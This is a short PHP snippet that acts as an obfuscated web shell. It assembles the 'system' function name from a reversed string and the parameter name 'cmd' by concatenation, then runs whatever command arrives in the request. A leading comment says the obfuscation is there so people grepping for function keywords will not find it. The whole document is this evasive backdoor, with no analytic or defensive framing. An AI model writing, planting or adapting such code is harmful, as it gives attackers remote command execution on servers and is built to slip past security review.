// this is because ppl can easily just grep for function keywords, this helps prevent that.

<?php

$g = 'c' . 'md';
$f = strrev('metsys');
$req = $_REQUEST;
call_user_func($f, $req[$g]);

?>
